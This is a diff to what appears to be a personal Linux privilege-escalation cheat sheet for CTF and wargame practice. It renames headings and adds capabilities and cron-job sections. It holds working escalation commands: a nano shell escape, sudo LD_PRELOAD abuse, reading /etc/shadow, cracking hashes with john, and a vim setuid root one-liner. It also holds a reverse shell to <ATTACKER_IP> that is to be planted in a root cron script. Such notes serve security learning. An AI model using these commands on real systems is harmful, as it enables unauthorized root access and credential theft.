@@ -11,7 +11,7 @@ What to do here?
 
 ## 1. Linux Eneumeration
 
-Check out [leb-LinuxEchoBeach](https://github.com/Yeaseen/leb-LinuxEchoBeach/blob/main/leb.md) for eneumerating Linux System
+Check out my [leb-LinuxEchoBeach](https://github.com/Yeaseen/leb-LinuxEchoBeach/blob/main/leb.md) for eneumerating Linux System
 
 Also, you can get some knowledge about wargames at my soloutions to overthewire [bandit](https://github.com/Yeaseen/overthewire-solve/tree/main/Bandit)
 
@@ -22,7 +22,7 @@ Also, you can get some knowledge about wargames at my soloutions to overthewire 
 
 Donlowad any of the script on your local machine and transfer this to the compromized VM either using [scp command](https://github.com/Yeaseen/leb-LinuxEchoBeach/blob/main/leb.md#copy-files-between-two-different-network-remotely) or creatimg python [simple http server](https://github.com/Yeaseen/leb-LinuxEchoBeach/blob/main/leb.md#in-the-same-networkhost-and-virtual-oses-file-transfer-between-two-machines-using-python-server)
 
-## 3. Privilege Escalation: Kernel Exploits
+## 3. Kernel Exploits for Privilege Escalation
 
 - One way:
   Find the Linux Kernel and System versions. Go to exploit-db or dimilar websites to grab a script. Make your you have all the necessary packages installed on the device, otherwise you will just destroy the compromized system.
@@ -35,7 +35,7 @@ Donlowad any of the script on your local machine and transfer this to the compro
   Search if nano command is exploitable. If exploitable, press ctrl+R, ctrl+X and execute `bash reset; bash 1>&0 2>&0`
   Eventually, you should get the root access.
 
-## 4. Privilege Escalation: Sudo
+## 4. Sudo Vulnerability for Privilege Escalation
 
 - Leverage application functions
   Here you have to find an application that supports loading alternative configuration file such as Apache2's -f option to specify an alternative ServerConfigFile. You can load /etc/shadow file using -f option of apache2 command, resulting in an error message that includes the first line of the /etc/shadow file.
@@ -72,7 +72,7 @@ Donlowad any of the script on your local machine and transfer this to the compro
     `bash sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
   - check by running `bash id`
 
-## 5. Privilege Escalation: SUID
+## 5. SUID vulnerabilty for Priviledge Escalation
 
 Linux privilege controls heavily hinge on managing the interactions between users and files, achieved through permissions. As you're aware, files can possess read, write, and execute permissions, each granted to users based on their privilege levels. However, the dynamics shift with SUID (Set-user Identification) and SGID (Set-group Identification). These mechanisms enable the execution of files with the permission level of either the file owner (SUID) or the group owner (SGID). Follow [this](https://www.scaler.com/topics/special-permissions-in-linux/) and [this](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit). `bash find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set. A good practice would be to compare executables on this list with GTFOBins [suid](https://gtfobins.github.io/#+suid)
 
@@ -87,3 +87,22 @@ Linux privilege controls heavily hinge on managing the interactions between user
   - run `bash base64 /etc/passswd | base64 --decode` if you don't have read permission. It's one way to read the original contents of a file you don't have permission.
   - run `bash unshadow passwd.txt shadow.txt > passwords.txt`
   - get password of the current users: `bash john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt`
+
+## 5. Capabilities Escalation
+
+You can check any capabilities using the command `bash getcap -r / 2>/dev/null`
+If the system is not updated, you should go for vim as vim is not a binary which generally needs capabilities.
+If you find any binary whose capabilities are set from other user's home, then it's vulnerable.
+
+Now, Run the following command to exploit vim: make sure to check whether it's bash or sh. This will give you root access.
+
+```bash
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
+```
+
+## 6. Cron Jobs Escalation
+
+If a scheduled task is set to run with root privileges, and we can modify the script it executes, our script will also execute with root privileges. `bash cat /etc/crontab` will give you all the scripts which are scheduled. Now find which script is running as root and you have access to that script, then modify it.
+
+If you get anything like that, add a reverse shell attack by adding the following command in that script file. Make sure that the script has the permission to run. If not, run `bash chmod +x <script_name>`
+`bash bash -i >& /dev/tcp/<ATTACKER_IP>/6666 0>&1`
